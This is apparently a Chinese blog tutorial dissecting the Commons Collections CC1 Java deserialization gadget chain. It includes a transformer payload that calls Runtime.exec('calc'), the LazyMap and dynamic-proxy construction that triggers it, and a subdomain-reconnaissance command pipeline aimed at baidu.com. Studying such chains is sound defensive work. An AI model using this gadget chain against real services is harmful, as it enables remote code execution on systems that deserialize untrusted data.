---
pubDatetime: 2026-07-16
title: "从三块积木到 CC1——Commons Collections 反序列化链精讲"
postSlug: cc-functors-functional-programming
featured: false
draft: false
ogImage: "/images/cc-functors-functional-programming/og.png"
tags:
  - Java
  - 代码审计
  - 反序列化
  - Commons Collections
  - 函数式编程
description: "从 Commons Collections 的三块基础积木出发，拆解 CC1 反序列化链是如何一步步被搭出来的。"
---

# 从三块积木到 CC1——Commons Collections 反序列化链精讲

CC1 经常被压缩成一条熟悉的调用顺序：

```text
readObject()
 -> ...
 -> Runtime.exec()
```

但这条顺序本身并不能解释两件更关键的事：Commons Collections 当年到底想补什么能力，这几块能力后来又为什么会被接进反序列化流程。

`ConstantTransformer`、`InvokerTransformer`、`ChainedTransformer` 也就不再只是链上的几个类名，而是三块先被设计出来、后来又被串进利用链的基础积木。

---

## 一、Commons Collections 想补的是什么能力

2000 年代初的 Java 还没有泛型，没有 lambda，也没有 `java.util.function`。但“把一段处理逻辑单独拿出来，再交给别的代码去执行”这种需求一直存在。Commons Collections 试图补上的，正是这一层表达能力。

它在 `org.apache.commons.collections` 里定义了一组 functor 接口：

| 接口 | 方法签名 | Java 8 中最接近的接口 |
|------|----------|------------------------|
| `Transformer` | `Object transform(Object input)` | `Function<T, R>` |
| `Predicate` | `boolean evaluate(Object obj)` | `Predicate<T>` |
| `Closure` | `void execute(Object input)` | `Consumer<T>` |
| `Factory` | `Object create()` | `Supplier<T>` |

CC 3.0 之后，`functors` 包里又继续补上了大量实现类。对 CC1 最关键的，不是全部 40 多个实现，而是其中三块最基础的积木：

| 需要表达的能力 | CC 中的实现 |
|----------------|-------------|
| 固定返回一个值 | `ConstantTransformer` |
| 把一次方法调用包装成一步 | `InvokerTransformer` |
| 把多个步骤顺序串起来 | `ChainedTransformer` |

放到今天看，这套设计对应的就是后来 Java 8 用标准库正式提供出来的那层能力：把处理步骤单独拿出来，再按顺序组合。

---

## 二、三块积木各自补了什么能力

如果把这三块积木放进一条熟悉的命令里，它们会更直观：

```bash
echo baidu.com | ./SubFinder/subfinder -silent | ./KsubDomain/ksubdomain -silent | ./HTTProbe/httprobe | ./HTTPX/httpx -title -ip
```

这条管道做的事情很简单：给定一个起点 `baidu.com`，后面的每个工具各做一步处理，再把结果继续交给下一个工具。CC 里的三块积木，刚好对应这条管道里的三个角色：起点、步骤、串联。

### 2.1 `ConstantTransformer`：固定给出一个起点

最简单的函数，是不管输入是什么，输出都一样：

```text
f(x) = c
```

`ConstantTransformer` 不关心上游输入，只负责稳定返回一个固定值：

```java
new ConstantTransformer("baidu.com").transform(null);  // -> "baidu.com"
```

对应代码里，关键其实只有这两处：

```java
private final Object iConstant;

public Object transform(Object input) {
    return iConstant;
}
```

`input` 传进来了，但根本没有参与计算，`transform()` 只是把构造时保存下来的 `iConstant` 原样返回出去。

放到上面那条命令里，它最像开头这一步：

```bash
echo baidu.com
```

前面有没有输入都不重要，它只负责给整条流程一个固定起点。

在正常场景里，这种能力并不危险。它只是把“起点”从代码里抽出来，变成一个可以被后续流程继续处理的对象。

### 2.2 `InvokerTransformer`：把一次方法调用包装成一步

`InvokerTransformer` 做的，是把一次方法调用本身对象化。

它会先记住三类信息：

- 调哪个方法
- 参数类型是什么
- 参数值是什么

等真正拿到输入对象之后，再在这个对象上按既定规则执行这次调用。

这层能力对应的代码也很直接：

```java
private final String iMethodName;
private final Class[] iParamTypes;
private final Object[] iArgs;

public Object transform(Object input) {
    Class cls = input.getClass();
    Method method = cls.getMethod(iMethodName, iParamTypes);
    return method.invoke(input, iArgs);
}
```

所以它表达的，不再是“代码里临时写一行调用”，而是：

```text
给我一个对象
 -> 在它上面调一次指定方法
 -> 把返回值交给下一步
```

放到那条管道里，`subfinder`、`ksubdomain`、`httprobe`、`httpx` 这些步骤都很像这种“拿到上一步的结果，再做一步既定处理”的过程。

一旦“方法调用”也能被包装成普通对象，后面它就能像其他步骤一样被继续串联。

### 2.3 `ChainedTransformer`：把步骤串成一条可传递的流程

前两块积木解决的是“步骤能不能被单独拿出来”。`ChainedTransformer` 解决的，则是“这些步骤拿出来之后，能不能按顺序接起来”。

它表达的是：

```text
F(x) = f3(f2(f1(x)))
```

也就是：

- 先执行 `f1`
- 把结果交给 `f2`
- 再把结果交给 `f3`

如果借 Linux 管道做类比，它更接近这种处理结构：

```text
step3(step2(step1(x)))
```

也就是：

```bash
echo baidu.com | subfinder | ksubdomain | httprobe | httpx
```

管道符不关心每一步具体做什么，只负责把上一步的输出稳定交给下一步。`ChainedTransformer` 在 Java 里承担的，也是这一层角色。

对应代码也正是这个结构：

```java
private final Transformer[] iTransformers;

public Object transform(Object object) {
    for (int i = 0; i < iTransformers.length; i++) {
        object = iTransformers[i].transform(object);
    }
    return object;
}
```

这三块积木放在一起，起点、步骤、串联也就都有了。

---

## 三、参数一换，正常抽象就会变成危险调用

问题不在于这三块积木本身“天生危险”，而在于它们对参数保持开放。设计者希望它们足够通用，攻击者利用的也正是这种通用性。

三块积木写成抽象形式，就是这样：

```java
static Transformer F1(Object constant) {
    return new ConstantTransformer(constant);
}

static Transformer F2(String method, Class[] types, Object[] args) {
    return new InvokerTransformer(method, types, args);
}

static Transformer F3(Transformer[] transformers) {
    return new ChainedTransformer(transformers);
}
```

把它们代回刚才那条命令，处理结构就是：

```text
F1("baidu.com")
 -> F2("subfinder")
 -> F2("ksubdomain")
 -> F2("httprobe")
 -> F2("httpx")
```

正常场景里，这些参数完全可以指向一条普通处理流程；但一旦参数换成下面这样：

```java
static Transformer payload() {
    return F3(new Transformer[] {
        F1(Runtime.class),
        F2("getMethod", new Class[]{String.class, Class[].class},
           new Object[]{"getRuntime", null}),
        F2("invoke", new Class[]{Object.class, Object[].class},
           new Object[]{null, null}),
        F2("exec", new Class[]{String.class},
           new Object[]{"calc"})
    });
}
```

它表达的就不再是普通处理逻辑，而是：

```text
Runtime.class
 -> getMethod("getRuntime", ...)
 -> invoke(null, null)
 -> exec("calc")
```

变化的不是 API，也不是类的设计意图，而是“方法调用能力”被串到了一个危险落点上。

CC1 后半段落到代码结构上，就是这一层：

```text
固定起点
 -> 单步调用
 -> 单步调用
 -> 单步调用
```

但这还只是手动触发。要进入反序列化利用，还缺一个更关键的条件：谁来替攻击者把这条链自动带起来。

---

## 四、`TransformedMap`：写操作是怎样接进链里的

`TransformedMap` 对应的是 CC1 的一条写时触发链。

先看它原本想解决的问题。`TransformedMap.decorate(map, null, valueTransformer)` 会在原始 `map` 外面再包一层，让它变成一个“写 value 之前，先经过 `valueTransformer` 处理”的 `Map`。

这个设计目标很朴素：我已经有一张普通 `Map`，但我希望以后无论谁往里面写值，都自动先做一遍转换。比如：

- 字符串先 `trim()`
- 统一转小写
- 做类型适配
- 做格式清洗

落到代码行为上，它做的事情就是把 `Map` 的写入动作稳定接到转换流程里。

到这里都还是“功能设计如此”。`TransformedMap` 本来就应该保证写入前先转换，问题不在这个设计本身，而在这层写前转换后来被带进了一个不该由外部数据驱动的反序列化流程。

```text
把写操作稳定接进 transform 流程
```

### 4.1 难点不在 `put()`，而在 `setValue()`

如果只盯着 `Map.put(key, value)`，这个需求并不难做。但 `Map` 的写入口不只这一条，还包括：

```java
map.entrySet().iterator().next().setValue(value);
```

也就是说，如果 `TransformedMap` 只拦截 `put()`，却放过 `Map.Entry.setValue()`，那它就没法保证“所有写入都经过转换”。

这也是它为什么要去改写 `entrySet()` 返回值。它返回的不是底层原始 `Entry`，而是包装过的 `Entry`，核心逻辑可以压成这样：

```java
public Object setValue(Object value) {
    value = parent.checkSetValue(value);
    return entry.setValue(value);
}
```

`setValue()` 会被接进转换流程，对应的关键就在这行：

```java
value = parent.checkSetValue(value);
```

真正把这次写入继续送到 `transform()` 的，是 `TransformedMap` 自己对 `checkSetValue()` 的实现：

```java
protected Object checkSetValue(Object value) {
    return valueTransformer.transform(value);
}
```

于是写链自然接通：

```text
entry.setValue(x)
 -> checkSetValue(x)
 -> valueTransformer.transform(x)
```

### 4.2 `AnnotationInvocationHandler` 为什么会点到这根引线

光有 `TransformedMap` 还不够。它只是把写操作接进了 transformer 流程，还没有解释反序列化时谁会替攻击者调用 `setValue()`。

CC1 利用的是 `AnnotationInvocationHandler.readObject()` 在反序列化之后那次“修正成员值”的动作。

它内部维护的是一张“注解成员名 -> 成员值”的表。`defaultReadObject()` 只能把字段从字节流里恢复回来，却不保证恢复之后仍然是一个合法的注解对象。于是 `readObject()` 还要再做一次检查：

- 成员名是否存在
- 成员值类型是否匹配

如果发现某一项不匹配，它不会重建整张表，而是会在遍历当前条目时直接调用：

```java
entry.setValue(...)
```

把这一项替换成 `AnnotationTypeMismatchExceptionProxy`。

压到代码结构上，就是这种形状：

```java
for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
    Object value = memberValue.getValue();
    if (...) {
        memberValue.setValue(new AnnotationTypeMismatchExceptionProxy(...));
    }
}
```

这里最关键的，不是“它会修值”这个结论，而是修值动作最后确实落成了一次 `Map.Entry.setValue(...)`。`TransformedMap` 只要接管了这一下，后面的 `transform()` 就会被稳定带起来。

对普通 `Map` 来说，这只是一次修值；但如果攻击者把这张表换成 `TransformedMap`，这次修值就会继续进入：

```text
readObject()
 -> entry.setValue(...)
 -> checkSetValue(...)
 -> transform(...)
 -> ChainedTransformer
```

### 4.3 为什么 payload 要故意放一个“错值”

CC1 不是把一份完全正常的注解成员表塞进 `AnnotationInvocationHandler`，再等它自然触发。它需要故意构造一份“成员名正确，但成员值类型错误”的 `memberValues`。

以 `Target.class` 为例，`value()` 期望的是 `ElementType[]`，payload 却故意塞入一个 `String`。这样 `readObject()` 在检查类型时就一定会进入 `entry.setValue(...)`，从而把前面埋在 `TransformedMap` 里的 transformer 链点起来。

这条链能成立，是因为“写前转换”这层设计和“反序列化后原地修值”这层设计接到了一起：`TransformedMap` 把 `setValue(...)` 接到了 `transform()`，`AnnotationInvocationHandler.readObject()` 又刚好会在类型不匹配时调用 `entry.setValue(...)`。

边界是在这里被跨过去的。单看 `TransformedMap`，它只是一个保证写入前转换的装饰器；单看 `AnnotationInvocationHandler.readObject()`，它只是反序列化后的合法性修补。问题出在这两层设计被外部可控对象图强行接到了一起。

---

## 五、`LazyMap`：读操作是怎样接进链里的

`LazyMap` 对应的是 CC1 另一条更常见的读时触发链。

先看它原本想解决的问题。普通 `Map` 遇到缺失 key 时，只会返回 `null`；`LazyMap` 则希望把这次读取继续往下做完。调用方不需要提前把所有 value 都准备好，第一次读到某个 key 时，再现场生成一个值，放回 `Map`，后面继续复用。

落到行为上，就是把缺失 key 的读取改成“现场生成一个值，再放回 `Map`”：

```text
key 不存在时，现场生成一个 value，再放回 Map
```

到这里也还是“功能设计如此”。`LazyMap` 本来就是为了把一次读操作延伸成“读取 + 按需生成 + 回填缓存”，问题同样不在这个设计本身，而在这层按需生成后来被借去承接一条攻击者布置好的 transformer 链。

这不是普通 `Map.get()` 的语义。普通 `Map` 的行为是“有就返回，没有就 `null`”；`LazyMap` 改成了“没有就现算一个出来”。

### 5.1 `LazyMap` 的 `get()` 被改成了什么

它的核心行为可以直接写成这样的 Java 结构：

```java
Object get(Object key) {
    if (!map.containsKey(key)) {
        Object value = factory.transform(key);
        map.put(key, value);
    }
    return map.get(key);
}
```

普通 `Map.get()` 到这里就结束了；`LazyMap` 还会继续往下走一步。key 不存在时，它会先调用 `factory.transform(key)` 生成一个 value，写回 `Map`，再把这个 value 返回出去。

对应到代码层，关键就是这几行：

```java
if (map.containsKey(key) == false) {
    Object value = factory.transform(key);
    map.put(key, value);
    return value;
}
return map.get(key);
```

正常场景里，这是“延迟计算”。但如果这里的 `factory` 被换成 `ChainedTransformer`，语义就变了：

```text
key 不存在
 -> 不再是补一个普通值
 -> 而是触发一条 transformer 链
```

### 5.2 从需要 `get()` 到找到 `Map` 调用点

`LazyMap.get()` 这一段确认之后，后半段已经够用了。问题变成了另一件事：反序列化过程中，需要有一个位置自动碰到攻击者可控的 `Map`，并且让这次操作继续落到 `LazyMap` 的读逻辑上。

这个位置至少要满足三件事：

```text
Serializable 类
 + readObject()
 + 反序列化恢复出来的 Map 字段
 + readObject() 过程中会自动调用这个 Map 的方法
```

JDK 里的 `AnnotationInvocationHandler` 正好提供了这样一个位置。它本来是给注解动态代理使用的 handler，内部保存了一张成员值表：

```java
class AnnotationInvocationHandler implements InvocationHandler, Serializable {
    private final Class<? extends Annotation> type;
    private final Map<String, Object> memberValues;
}
```

`memberValues` 会跟着对象一起反序列化回来，而且在 `readObject()` 里被直接遍历：

```java
for (Map.Entry<String, Object> memberValue : memberValues.entrySet()) {
    String name = memberValue.getKey();
    Object value = memberValue.getValue();
    ...
}
```

这一步还不是 `get()`，只是 `entrySet()`。它的价值在于：反序列化阶段已经出现了一次攻击者可控 `Map` 的接口方法调用。

动态代理正好能把这个缺口串起来。JDK Proxy 不要求背后真的有一个 `HashMap`、`LazyMap` 或别的实体类；它只要求代理对象“看起来实现了某个接口”。调用接口方法时，真实执行会统一转进 `InvocationHandler.invoke()`。于是 `readObject()` 里的 `memberValues.entrySet()`，可以不落到普通 `Map.entrySet()`，而是先落到另一个 handler。

构造过程如下：

```java
Map lazyMap = LazyMap.decorate(innerMap, chainedTransformer);
InvocationHandler innerHandler =
    new AnnotationInvocationHandler(Override.class, lazyMap);
Map proxyMap = (Map) Proxy.newProxyInstance(
    Map.class.getClassLoader(),
    new Class[]{Map.class},
    innerHandler
);
Object outerHandler =
    new AnnotationInvocationHandler(Override.class, proxyMap);
```

这条链里有两个 `AnnotationInvocationHandler`：

- 外层 handler：负责在反序列化阶段进入 `readObject()`
- 内层 handler：负责接住代理对象的方法调用，再把它转到 `LazyMap`

`proxyMap` 不是一个真实的 `Map` 实现，而是 JDK 动态代理生成出来的对象。`new Class[]{Map.class}` 指定它要实现 `Map` 接口；以后谁在这个对象上调用 `Map` 的方法，都会先进 `innerHandler.invoke(...)`。

把代理类的方法体压缩后，大致就是这种结构：

```java
public final Set entrySet() {
    return (Set) handler.invoke(this, entrySetMethod, null);
}
```

### 5.3 调用是怎样一路转到 `LazyMap.get()` 的

外层 `AnnotationInvocationHandler.readObject()` 在处理 `memberValues` 时，会先调用：

```text
memberValues.entrySet()
```

但这时的 `memberValues` 不是普通 `Map`，而是前面那层 `proxyMap`。`proxyMap` 只是“看起来像 `Map`”，本质上仍然是动态代理对象，所以这次 `entrySet()` 调用不会直接落到某个真实的 `Map` 实现上，而是会被 JDK 代理机制转发成：

```java
innerHandler.invoke(proxyMap, entrySetMethod, null)
```

这里传进去的 `entrySetMethod`，就是 `Map.entrySet()` 对应的那个 `Method` 对象。也就是说，进入内层 `invoke()` 时，这次调用的“方法名”已经被代理层原样带进来了。

`AnnotationInvocationHandler.invoke()` 原本就是一个“按方法名取值”的 handler。它拿到 `Method` 之后，会先取出方法名，再去内部那张表里按这个名字找对应的值。压缩后可以理解成：

```text
method.getName()   -> "entrySet"
memberValues.get("entrySet")
```

压到代码层，就是这样：

```java
String member = method.getName();
Object result = memberValues.get(member);
```

于是调用链会继续变成：

```text
outer AnnotationInvocationHandler.readObject()
 -> outer.memberValues.entrySet()
 -> proxyMap.entrySet()
 -> inner AnnotationInvocationHandler.invoke()
 -> inner.memberValues.get("entrySet")
 -> LazyMap.get("entrySet")
 -> ChainedTransformer.transform("entrySet")
```

而这里的 `memberValues`，正是攻击者提前布置好的 `LazyMap`。因为 `LazyMap` 里原本并没有 `"entrySet"` 这个 key，所以 `get("entrySet")` 会走进懒加载分支，后面的 `transform()` 也就被带起来了。

这条链能成立，是因为外层 `readObject()` 先触发了一次 `Map` 调用，代理层把这次调用转发给内层 `AnnotationInvocationHandler.invoke()`，内层 handler 又把方法名 `"entrySet"` 当成 key 去做 `memberValues.get("entrySet")`。只要这里的 `memberValues` 是攻击者布置好的 `LazyMap`，缺失 key 的读取就会继续落到 `ChainedTransformer`。

边界也是在这里被跨过去的。单看 `LazyMap`，缺 key 时生成一个值再写回去完全是正常功能；单看动态代理，它也只是把接口方法统一转发给 `InvocationHandler`。问题出在反序列化阶段这次本该普通的 `entrySet()` 调用，被一层层转成了 `LazyMap.get("entrySet")`，最后又落到了攻击者事先准备好的生成逻辑上。

---

## 六、为什么 CC1 的利用条件长期存在

Java 8 已经有了 `java.util.function`，这些 functor 类在业务代码里几乎没人主动写了，CC1 却还是长期有利用条件。

原因不在 functor 包本身，而在整个 Commons Collections 被广泛依赖。

### 6.1 被大量使用的不是 functor，而是整个 CC 包

`commons-collections-3.2.1.jar` 里有 273 个类，functor 只占其中一小部分。让它长期躺在大量 classpath 上的，是别的常用工具类：

| 类 | 用途 |
|----|------|
| `CollectionUtils` | 集合判空、过滤、转换 |
| `MapUtils` | Map 判空、安全取值 |
| `ListUtils` | 差集、交集、分区 |
| `LRUMap` | LRU 缓存 |
| `Bag` / `HashBag` | 计数集合 |
| `BidiMap` | 双向 Map |
| `BeanMap` | JavaBean 与 Map 互转 |

也就是说，很多项目并不是“为了用 `InvokerTransformer` 才引入 CC”，而是为了这些普通工具类。functor 类只是跟着一起被带进来了。

### 6.2 利用条件只有两条

对 CC1 来说，利用条件只有两条：

1. classpath 上有 Commons Collections 3.x
2. 应用暴露了可用的反序列化入口

这两条一旦同时成立，前面那套能力组合就有了落地空间。

### 6.3 4.x 的修补没有改逻辑，而是改接触面

Apache 后来在 Commons Collections 4.x 里去掉了 `InvokerTransformer` 的 `Serializable`。这一步没有改 `transform()` 的逻辑，而是直接切断了它进入反序列化链的入口。

**CC 3.2.1：**

```java
public class InvokerTransformer implements Transformer, Serializable {
    private final String iMethodName;
    private final Class[] iParamTypes;
    private final Object[] iArgs;
}
```

**CC 4.4：**

```java
public class InvokerTransformer<I, O> implements Transformer<I, O> {
    private final String iMethodName;
    private final Class<?>[] iParamTypes;
    private final Object[] iArgs;
}
```

功能还在，但它不再具备通过序列化边界进入 payload 的条件。

---

## 七、收束

CC1 不是“某个危险类自动导致命令执行”，而是几块原本正常的能力被串到了一起：`ConstantTransformer` 给出固定起点，`InvokerTransformer` 负责单步调用，`ChainedTransformer` 负责把这些调用接成长链，`TransformedMap` 和 `LazyMap` 分别把写操作和读操作接进 transformer 流程，`AnnotationInvocationHandler.readObject()` 再把这套流程带进反序列化阶段。

落到一起，就是：

```text
固定起点
 + 单步调用
 + 多步串联
 + 自动触发点
 = CC1
```

后面再看 `CC3`、`CC6`，链名会变，类会变，触发点也会变，但“还剩什么、缺什么、怎么补齐”这套分析方式不会变。

## 八、附录：环境信息

| 组件 | 版本 |
|------|------|
| JDK | 1.8.0_60 |
| Commons Collections | 3.2.1 |
| 关键依赖位置 | `org.apache.commons.collections.functors` |
